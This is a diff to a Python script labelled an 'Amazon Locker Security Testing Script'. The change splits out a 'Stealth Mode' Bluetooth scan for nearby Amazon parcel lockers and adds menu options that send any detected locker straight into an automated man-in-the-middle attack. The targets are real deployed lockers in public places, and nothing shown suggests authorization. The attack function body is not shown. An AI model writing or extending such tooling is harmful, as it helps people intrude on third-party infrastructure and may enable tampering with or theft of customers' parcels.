@@ -110,21 +110,21 @@ async def locker_detection():
     if wifi_results:
         print("[+] Amazon Lockers detected via Wi-Fi:", wifi_results)
         return wifi_results[0]
-    
-    # Use bleak to scan for Bluetooth lockers
+
+    print("[+] No Amazon lockers detected via Wi-Fi. You can try Bluetooth or Local Network.")
+
+    return None
+
+# Function to scan for Bluetooth lockers (optional)
+async def bluetooth_scan():
     print("[+] Scanning for Bluetooth devices (Stealth Mode)...")
     devices = await BleakScanner.discover()
     locker_bluetooth = [dev.address for dev in devices if "AmazonLocker" in dev.name]
     if locker_bluetooth:
         print("[+] Amazon Lockers detected via Bluetooth:", locker_bluetooth)
         return locker_bluetooth[0]
-
-    network_results = slow_scan_local_network()
-    if network_results:
-        print("[+] Amazon Lockers detected on Local Network:", network_results)
-        return network_results[0]
-
-    print("[-] No Amazon lockers detected. Try again closer to a location.")
+    
+    print("[-] No Amazon lockers detected via Bluetooth.")
     return None
 
 # MitM Attack Module (Automated after detection)
@@ -153,8 +153,9 @@ def main():
 
     while True:
         print("\n==== Amazon Locker Security Testing Script ====")
-        print("1. Detect and Attack Nearby Locker")
-        print("2. Exit")
+        print("1. Detect and Attack Nearby Locker (Wi-Fi)")
+        print("2. Scan for Bluetooth Lockers")
+        print("3. Exit")
 
         choice = input("Select an option: ")
 
@@ -163,6 +164,10 @@ def main():
             if target_locker:
                 mitm_attack(target_locker)
         elif choice == "2":
+            target_locker = asyncio.run(bluetooth_scan())
+            if target_locker:
+                mitm_attack(target_locker)
+        elif choice == "3":
             cleanup()
         else:
             print("Invalid option. Please try again.")
